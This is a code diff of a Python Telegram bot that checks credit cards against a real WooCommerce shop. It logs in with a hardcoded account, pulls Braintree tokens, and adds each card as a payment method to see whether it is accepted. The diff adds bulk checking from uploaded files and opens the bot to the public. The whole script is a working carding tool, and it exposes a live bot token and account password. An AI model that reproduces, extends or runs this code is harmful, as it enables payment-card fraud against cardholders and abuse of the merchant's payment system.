@@ -7,23 +7,24 @@ import asyncio
 import aiohttp
 import time
 import logging
+import threading
+from flask import Flask
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
-from telegram.ext import ConversationHandler, MessageHandler, filters
+from datetime import datetime
 
-# ---------- BOT CONFIGURATION ----------
-BOT_TOKEN = "7033106060:AAHXbgIlI7iMngcRw543ONGUvFzt-TTOvbM"
-ALLOWED_USER_ID = 2117119246
+# ---------- HARDCODED CONFIG ----------
+EMAIL = "00t0a9@givememail.club"
+PASSWORD = "Lundka143"
+BOT_TOKEN = "7033106060:AAHXbgIlI7iMngcRw543ONGUvFzt-TTOvbM"   # <-- Replace with your bot token
 
 logging.basicConfig(level=logging.INFO)
+start_time = datetime.now()
 
-# Conversation states
-EMAIL_STATE, PASSWORD_STATE, CARD_STATE = range(3)
+# ---------- FOOTER FOR ALL MESSAGES ----------
+FOOTER = "\n\n━━━━━━━━━━━━━━━━\n✨ *Made By : @AnonymousJxksh* ✨"
 
-# Dictionary to store user sessions
-user_sessions = {}
-
-# ---------- HEADER FUNCTIONS ----------
+# ---------- YOUR ORIGINAL FUNCTIONS (COMPLETELY UNCHANGED) ----------
 def h1():
     return {
         'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
@@ -129,370 +130,289 @@ def bt_h(fp):
         'Accept-Language': 'en-US,en;q=0.9',
     }
 
-def login(email, password):
-    """Login with provided credentials"""
-    try:
-        s = requests.Session()
-        
-        # Step 1: Get login page
-        print(f"📍 Logging in as: {email}")
-        r = s.get('https://livresq.com/en/my-account/', headers=h1(), timeout=10)
-        print(f"   Status: {r.status_code}")
-        
-        if r.status_code == 503:
-            print("⚠️  SERVER UNAVAILABLE (503)")
-            return None, "Server unavailable (503)"
-        
-        if r.status_code != 200:
-            return None, f"Failed to get login page. Status: {r.status_code}"
-        
-        # Extract nonce
-        n = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text)
-        if not n:
-            return None, "Could not extract login nonce"
-        
-        print("✅ Login Nonce found")
-        
-        # Step 2: Submit login credentials
-        print("📍 Submitting credentials...")
-        d = {
-            'username': email,
-            'password': password,
-            'woocommerce-login-nonce': n.group(1),
-            '_wp_http_referer': '/en/contul-meu/',
-            'login': 'Log in',
-            'trp-form-language': 'en'
-        }
-        
-        r = s.post('https://livresq.com/en/my-account/', headers=h2(), data=d, timeout=10)
-        print(f"   Status: {r.status_code}")
-        
-        # Handle 503 error
-        if r.status_code == 503:
-            return None, "Server unavailable (503)"
-        
-        if r.status_code != 200:
-            return None, f"Login POST failed. Status: {r.status_code}"
-        
-        # Check for explicit error messages
-        if 'woocommerce-error' in r.text:
-            error_match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
-            if error_match:
-                error_msg = re.sub(r'<[^>]+>', '', error_match.group(1).strip())
-                return None, f"Login error: {error_msg}"
-            return None, "Login failed"
-        
-        # Verify login success
-        print("📍 Verifying login...")
-        
-        # Check for logout button
-        if re.search(r'<a[^>]*href="[^"]*logout[^"]*"[^>]*>.*?Log\s*Out|Logout', r.text, re.IGNORECASE):
-            print("✅ LOGIN SUCCESSFUL")
-            return s, "Login successful"
-        
-        # Check for account navigation
-        if 'woocommerce-MyAccount-navigation' in r.text or 'customer-logout' in r.text:
-            print("✅ LOGIN SUCCESSFUL")
-            return s, "Login successful"
-        
-        return None, "Could not verify login status"
-            
-    except requests.exceptions.Timeout:
-        return None, "Request timeout"
-    except requests.exceptions.ConnectionError:
-        return None, "Connection failed"
-    except Exception as e:
-        return None, f"Login error: {str(e)}"
+def login():
+    s = requests.Session()
+    r = s.get('https://livresq.com/en/my-account/', headers=h1())
+    n = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text)
+    if not n: return None
+    print("Login Nonce:", n.group(1))
+    d = {
+        'username': EMAIL,
+        'password': PASSWORD,
+        'woocommerce-login-nonce': n.group(1),
+        '_wp_http_referer': '/en/contul-meu/',
+        'login': 'Log in',
+        'trp-form-language': 'en'
+    }
+    r = s.post('https://livresq.com/en/my-account/', headers=h2(), data=d)
+    if 'woocommerce-error' in r.text or not ('logout' in r.text.lower() or 'dashboard' in r.text.lower()):
+        return None
+    return s
 
 def get_nonces(s):
-    """Extract nonces from add payment method page"""
-    try:
-        r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3(), timeout=10)
-        
-        if r.status_code == 503:
-            return None, None
-        
-        if r.status_code != 200:
-            return None, None
-        
-        # Extract add payment method nonce
-        an = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r.text)
-        
-        # Extract client token nonce
-        cn = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', r.text)
-        if not cn:
-            cn = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)', r.text)
-        
-        if not an or not cn:
-            return None, None
-        
-        return an.group(1), cn.group(1)
-    except:
-        return None, None
+    r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3())
+    an = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r.text)
+    print("Add Nonce:", an.group(1) if an else "NOT FOUND")
+    cn = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', r.text)
+    if not cn:
+        cn = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)', r.text)
+    print("Client Nonce:", cn.group(1) if cn else "NOT FOUND")
+    if not an or not cn: return None, None
+    return an.group(1), cn.group(1)
 
 def get_fp(s, cn):
-    """Get authorization fingerprint from Braintree"""
-    if not cn:
-        return None
-    
+    if not cn: return None
+    d = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': cn}
+    r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=d)
+    if r.status_code != 200: return None
     try:
-        d = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': cn}
-        r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=d, timeout=10)
-        
-        if r.status_code != 200:
-            return None
-        
         j = r.json()
-        if 'data' not in j:
-            return None
-        
         dt = base64.b64decode(j['data']).decode('utf-8')
         fp = json.loads(dt).get('authorizationFingerprint')
-        
+        print("Fingerprint:", fp)
         return fp
-            
     except:
         return None
 
 async def tok(fp, cc, mm, yy, cv):
-    """Tokenize credit card via Braintree GraphQL"""
-    try:
-        async with aiohttp.ClientSession() as ses:
-            sid = str(uuid.uuid4())
-            q = {
-                'clientSdkMetadata': {'source':'client','integration':'custom','sessionId':sid},
-                'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
-                    tokenizeCreditCard(input: $input) {
-                        token
-                    }
-                }''',
-                'variables': {
-                    'input': {
-                        'creditCard': {'number':cc,'expirationMonth':mm,'expirationYear':yy,'cvv':cv},
-                        'options': {'validate': False}
-                    }
-                },
-                'operationName': 'TokenizeCreditCard'
-            }
-            async with ses.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=q, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                if resp.status != 200:
-                    return None
-                
-                res = await resp.json()
-                token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
-                
-                return token
-                    
-    except:
-        return None
+    async with aiohttp.ClientSession() as ses:
+        sid = str(uuid.uuid4())
+        q = {
+            'clientSdkMetadata': {'source':'client','integration':'custom','sessionId':sid},
+            'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
+                tokenizeCreditCard(input: $input) {
+                    token
+                }
+            }''',
+            'variables': {
+                'input': {
+                    'creditCard': {'number':cc,'expirationMonth':mm,'expirationYear':yy,'cvv':cv},
+                    'options': {'validate': False}
+                }
+            },
+            'operationName': 'TokenizeCreditCard'
+        }
+        async with ses.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=q) as resp:
+            if resp.status != 200: return None
+            res = await resp.json()
+            token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
+            print("Token:", token)
+            return token
 
 def add_pm(s, pt, an):
-    """Add payment method to account"""
-    for attempt in range(4):
-        try:
-            pd = {
-                'payment_method': 'braintree_credit_card',
-                'wc-braintree-credit-card-card-type': 'visa',
-                'wc-braintree-credit-card-3d-secure-enabled': '',
-                'wc-braintree-credit-card-3d-secure-verified': '',
-                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-                'wc_braintree_credit_card_payment_nonce': pt,
-                'wc_braintree_device_data': '',
-                'wc-braintree-credit-card-tokenize-payment-method': 'true',
-                'woocommerce-add-payment-method-nonce': an,
-                '_wp_http_referer': '/en/contul-meu/add-payment-method/',
-                'woocommerce_add_payment_method': '1',
-                'trp-form-language': 'en'
-            }
-            r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=pd, timeout=10)
-            
-            if r.status_code == 503:
-                time.sleep(15)
-                continue
-            
-            # Rate limiting check
-            if 'You cannot add a new payment method so soon' in r.text:
-                time.sleep(15)
-                continue
-            
-            # Error check
-            em = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
-            if em:
-                et = re.sub(r'\s+', ' ', em.group(1).strip())
-                et = re.sub(r'&nbsp;', ' ', et)
-                return False, et
-            
-            # Success check
-            if any(x in r.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
-                return True, "APPROVED"
-            
-            # Message check
-            sm = re.search(r'<div class="woocommerce-message"[^>]*>(.*?)</div>', r.text, re.DOTALL)
-            if sm:
-                st = re.sub(r'<[^>]+>', '', sm.group(1).strip())
-                st = re.sub(r'\s+', ' ', st)
-                return True, st
-            
-            # Wait before retry
-            if attempt < 3:
-                time.sleep(15)
-                
-        except:
-            pass
-    
+    for _ in range(4):
+        pd = {
+            'payment_method': 'braintree_credit_card',
+            'wc-braintree-credit-card-card-type': 'visa',
+            'wc-braintree-credit-card-3d-secure-enabled': '',
+            'wc-braintree-credit-card-3d-secure-verified': '',
+            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+            'wc_braintree_credit_card_payment_nonce': pt,
+            'wc_braintree_device_data': '',
+            'wc-braintree-credit-card-tokenize-payment-method': 'true',
+            'woocommerce-add-payment-method-nonce': an,
+            '_wp_http_referer': '/en/contul-meu/add-payment-method/',
+            'woocommerce_add_payment_method': '1',
+            'trp-form-language': 'en'
+        }
+        r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=pd)
+        if 'You cannot add a new payment method so soon' in r.text:
+            time.sleep(15)
+            continue
+        em = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
+        if em:
+            et = re.sub(r'\s+', ' ', em.group(1).strip())
+            et = re.sub(r'&nbsp;', ' ', et)
+            return False, et
+        if any(x in r.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
+            return True, "APPROVED"
+        sm = re.search(r'<div class="woocommerce-message"[^>]*>(.*?)</div>', r.text, re.DOTALL)
+        if sm:
+            st = re.sub(r'<[^>]+>', '', sm.group(1).strip())
+            st = re.sub(r'\s+', ' ', st)
+            return True, st
+        time.sleep(15)
     return False, "UNKNOWN"
 
 async def proc(s, cc, mm, yy, cv):
-    """Main processing function"""
-    print("\n--- 🎯 Starting Card Processing ---")
-    
     an, cn = get_nonces(s)
-    if not an or not cn:
-        return False, "NONCES FAILED"
-    
+    if not an or not cn: return False, "NONCES FAILED"
     fp = get_fp(s, cn)
-    if not fp:
-        return False, "FINGERPRINT FAILED"
-    
+    if not fp: return False, "FINGERPRINT FAILED"
     pt = await tok(fp, cc, mm, yy, cv)
-    if not pt:
-        return False, "TOKENIZE FAILED"
-    
+    if not pt: return False, "TOKENIZE FAILED"
     return add_pm(s, pt, an)
 
-# ---------- TELEGRAM CONVERSATION HANDLERS ----------
-
+# ---------- TELEGRAM HANDLERS (enhanced UI + footer) ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start command"""
-    user_id = update.effective_user.id
-    if ALLOWED_USER_ID and user_id != ALLOWED_USER_ID:
-        await update.message.reply_text("❌ Unauthorized user.")
-        return ConversationHandler.END
-    
     await update.message.reply_text(
-        "👋 Welcome! I'll help you check cards.\n\n"
-        "First, send your email for livresq.com account:"
+        "🤖 *Welcome to Card Check Bot*\n\n"
+        "I can validate your cards via Braintree.\n\n"
+        "📌 *Available Commands:*\n"
+        "• `/chk` – Check a single card\n"
+        "• `/mchk` – Check multiple cards from a `.txt` file\n"
+        "• `/status` – Bot uptime & health\n"
+        "• `/help` – Detailed usage guide\n\n"
+        "🔐 *All transactions are secure and private.*" + FOOTER,
+        parse_mode="Markdown"
     )
-    return EMAIL_STATE
 
-async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Get email from user"""
-    user_id = update.effective_user.id
-    email = update.message.text.strip()
-    
-    # Basic email validation
-    if '@' not in email or '.' not in email:
-        await update.message.reply_text("❌ Invalid email format. Please try again:")
-        return EMAIL_STATE
-    
-    user_sessions[user_id] = {'email': email}
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        f"✅ Email saved: {email}\n\n"
-        "Now send your password:"
+        "📖 *Detailed Usage*\n\n"
+        "➡️ *Single Card Check*\n"
+        "`/chk <card_number|expiry_month|expiry_year|cvv>`\n"
+        "Example: `/chk 4111111111111111|12|26|123`\n\n"
+        "➡️ *Bulk Check (from file)*\n"
+        "Send a `.txt` file with one card per line in the **same format**.\n"
+        "Example:\n"
+        "`4111111111111111|12|26|123`\n"
+        "`5555555555554444|01|27|456`\n\n"
+        "➡️ *Status*\n"
+        "`/status` – Shows uptime and health.\n\n"
+        "⚡ *Results are returned instantly.*" + FOOTER,
+        parse_mode="Markdown"
     )
-    return PASSWORD_STATE
 
-async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Get password from user"""
-    user_id = update.effective_user.id
-    password = update.message.text.strip()
-    
-    if len(password) < 4:
-        await update.message.reply_text("❌ Password too short. Please try again:")
-        return PASSWORD_STATE
-    
-    user_sessions[user_id]['password'] = password
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uptime = datetime.now() - start_time
     await update.message.reply_text(
-        "✅ Credentials saved!\n\n"
-        "Now send card in this format:\n"
-        "<card_number>|<month>|<year>|<cvv>\n\n"
-        "Example: 4111111111111111|12|25|123"
+        f"🟢 *Bot is online & healthy*\n"
+        f"⏱️ Uptime: `{str(uptime).split('.')[0]}`\n"
+        f"👤 Public access: *Enabled*" + FOOTER,
+        parse_mode="Markdown"
     )
-    return CARD_STATE
 
-async def get_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Get and process card"""
-    user_id = update.effective_user.id
-    
-    if user_id not in user_sessions:
-        await update.message.reply_text("❌ Session expired. Use /start to begin.")
-        return ConversationHandler.END
-    
-    raw = update.message.text.strip()
+async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text(
+            "❌ *Missing card details*\n\n"
+            "Correct format:\n"
+            "`/chk <number|month|year|cvv>`\n"
+            "Example: `/chk 4111111111111111|12|26|123`" + FOOTER,
+            parse_mode="Markdown"
+        )
+        return
+
+    raw = ' '.join(context.args).strip()
     parts = raw.split('|')
-    
     if len(parts) != 4:
         await update.message.reply_text(
-            "❌ Invalid format.\n\n"
-            "Please send: <card>|<month>|<year>|<cvv>\n"
-            "Example: 4111111111111111|12|25|123"
+            "❌ *Invalid format*\n\n"
+            "Use: `/chk 4111111111111111|12|26|123`" + FOOTER,
+            parse_mode="Markdown"
         )
-        return CARD_STATE
-    
+        return
+
     cc, mes, ano, cvv = [p.strip() for p in parts]
-    
     if not (cc.isdigit() and mes.isdigit() and ano.isdigit() and cvv.isdigit()):
-        await update.message.reply_text("❌ All fields must be numeric. Please try again:")
-        return CARD_STATE
-    
-    # Get credentials
-    email = user_sessions[user_id]['email']
-    password = user_sessions[user_id]['password']
-    
-    await update.message.reply_text("⏳ Processing card... (this may take 30-60s)")
-    
-    try:
-        # Login with provided credentials
-        s, login_msg = login(email, password)
-        if not s:
-            await update.message.reply_text(f"❌ LOGIN FAILED\n{login_msg}")
-            return CARD_STATE
-        
-        # Process card
-        ok, msg = await proc(s, cc, mes, ano, cvv)
-        if ok:
-            await update.message.reply_text(f"✅ Response: {msg}")
-        else:
-            await update.message.reply_text(f"❌ Response: {msg}")
-        
-        # Ask if they want to check another card
         await update.message.reply_text(
-            "Want to check another card?\n"
-            "Send the card details or /start for new account"
+            "❌ *All fields must be numeric*" + FOOTER,
+            parse_mode="Markdown"
         )
-        return CARD_STATE
-        
+        return
+
+    msg = await update.message.reply_text("⏳ *Processing card…* (30‑60s)", parse_mode="Markdown")
+    try:
+        s = login()
+        if not s:
+            await msg.edit_text("❌ *Login failed* – check credentials." + FOOTER, parse_mode="Markdown")
+            return
+        ok, result = await proc(s, cc, mes, ano, cvv)
+        icon = "✅" if ok else "❌"
+        await msg.edit_text(
+            f"{icon} *Result:* `{result}`\n"
+            f"📋 Card: `{cc[-4:]}` (ends with {cc[-4:]})" + FOOTER,
+            parse_mode="Markdown"
+        )
     except Exception as e:
-        await update.message.reply_text(f"⚠️ Error: {str(e)}")
-        return CARD_STATE
+        await msg.edit_text(f"⚠️ *Error:* `{str(e)}`" + FOOTER, parse_mode="Markdown")
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Cancel conversation"""
-    user_id = update.effective_user.id
-    if user_id in user_sessions:
-        del user_sessions[user_id]
-    
-    await update.message.reply_text("❌ Cancelled. Use /start to begin again.")
-    return ConversationHandler.END
+async def multiple_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.message.document:
+        await update.message.reply_text(
+            "📎 *Please send a `.txt` file* with one card per line.\n\n"
+            "Format:\n"
+            "`number|month|year|cvv`\n\n"
+            "Example:\n"
+            "`4111111111111111|12|26|123`" + FOOTER,
+            parse_mode="Markdown"
+        )
+        return
 
-# ---------- MAIN ----------
-def main():
+    doc = update.message.document
+    if not doc.file_name.endswith('.txt'):
+        await update.message.reply_text(
+            "❌ *Only `.txt` files are accepted.*" + FOOTER,
+            parse_mode="Markdown"
+        )
+        return
+
+    msg = await update.message.reply_text("⏳ *Downloading & processing file…*", parse_mode="Markdown")
+    try:
+        file = await doc.get_file()
+        content = await file.download_as_bytearray()
+        lines = content.decode('utf-8').strip().splitlines()
+        if not lines:
+            await msg.edit_text("❌ *File is empty.*" + FOOTER, parse_mode="Markdown")
+            return
+
+        results = []
+        total = len(lines)
+        for idx, line in enumerate(lines, 1):
+            line = line.strip()
+            if not line:
+                continue
+            parts = line.split('|')
+            if len(parts) != 4:
+                results.append(f"Line {idx}: ⚠️ Invalid format (skipped)")
+                continue
+            cc, mes, ano, cvv = [p.strip() for p in parts]
+            if not (cc.isdigit() and mes.isdigit() and ano.isdigit() and cvv.isdigit()):
+                results.append(f"Line {idx}: ⚠️ Non‑numeric (skipped)")
+                continue
+
+            s = login()
+            if not s:
+                results.append(f"Line {idx}: ❌ Login failed")
+                continue
+            ok, res = await proc(s, cc, mes, ano, cvv)
+            icon = "✅" if ok else "❌"
+            results.append(f"Line {idx}: {icon} {res}")
+            await asyncio.sleep(2)  # gentle delay
+
+        # Build final summary
+        summary = "📊 *Bulk Results*\n\n" + "\n".join(results) + FOOTER
+        if len(summary) > 4000:
+            for i in range(0, len(summary), 4000):
+                await update.message.reply_text(summary[i:i+4000], parse_mode="Markdown")
+        else:
+            await msg.edit_text(summary, parse_mode="Markdown")
+
+    except Exception as e:
+        await msg.edit_text(f"⚠️ *Error:* `{str(e)}`" + FOOTER, parse_mode="Markdown")
+
+# ---------- FLASK APP ----------
+flask_app = Flask(__name__)
+
+@flask_app.route('/')
+def health():
+    return "Bot is running"
+
+# ---------- START BOT ----------
+def run_telegram_bot():
     app = Application.builder().token(BOT_TOKEN).build()
-    
-    # Conversation handler for login and card check flow
-    conv_handler = ConversationHandler(
-        entry_points=[CommandHandler('start', start)],
-        states={
-            EMAIL_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
-            PASSWORD_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
-            CARD_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_card)],
-        },
-        fallbacks=[CommandHandler('cancel', cancel)],
-    )
-    
-    app.add_handler(conv_handler)
-    print("🤖 Bot is running... Press Ctrl+C to stop")
-    app.run_polling()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("status", status))
+    app.add_handler(CommandHandler("chk", single_check))
+    app.add_handler(CommandHandler("mchk", multiple_check))
+    print("🤖 Telegram bot started – polling...")
+    # Use stop_signals=() to disable signal handlers in background thread
+    app.run_polling(stop_signals=())
 
-if __name__ == "__main__":
-    main()
+if __name__ != '__main__':
+    thread = threading.Thread(target=run_telegram_bot, daemon=True)
+    thread.start()
+else:
+    run_telegram_bot()
